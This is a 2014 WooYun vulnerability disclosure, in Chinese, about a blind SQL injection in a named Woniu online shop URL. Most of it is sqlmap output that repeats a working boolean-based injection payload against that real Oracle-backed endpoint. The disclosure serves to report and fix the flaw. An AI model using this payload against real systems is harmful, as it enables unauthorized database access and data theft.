wybug_detail: 漏洞详情 披露状态：   									2014-07-17：	细节已通知厂商并且等待厂商处理中									2014-07-17：	厂商已经确认，细节仅向厂商公开									2014-07-27：	细节向核心白帽子及相关领域专家公开									2014-08-06：	细节向普通白帽子公开									2014-08-16：	细节向实习白帽子公开									2014-08-31：	细节向公众公开  简要描述： 给你们讲个笑话：从前有个大型游戏公司招聘安全人员！ PS：蜗牛安全人员你的节操呢？ 详细说明：  http://shop.woniu.com/direct/merDetail.do?s=77&cmd=queryMainMer&t=135&gi=3&f=75 (GET)   漏洞证明：  sqlmap identified the following injection points with a total of 78 HTTP(s) requests:---Place: GETParameter: s    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: s=77' AND 3383=3383 AND 'pxqO'='pxqO&cmd=queryMainMer&t=135&gi=3&f=75---web application technology: JSPback-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: s    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: s=77' AND 3383=3383 AND 'pxqO'='pxqO&cmd=queryMainMer&t=135&gi=3&f=75---web application technology: JSPback-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: s    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: s=77' AND 3383=3383 AND 'pxqO'='pxqO&cmd=queryMainMer&t=135&gi=3&f=75---web application technology: JSPback-end DBMS: Oraclecurrent schema (equivalent to database on Oracle):	Nonesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: s    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: s=77' AND 3383=3383 AND 'pxqO'='pxqO&cmd=queryMainMer&t=135&gi=3&f=75---web application technology: JSPback-end DBMS: Oraclecurrent user:	None   修复方案：  过滤   版权声明：转载请注明来源 疯子@乌云
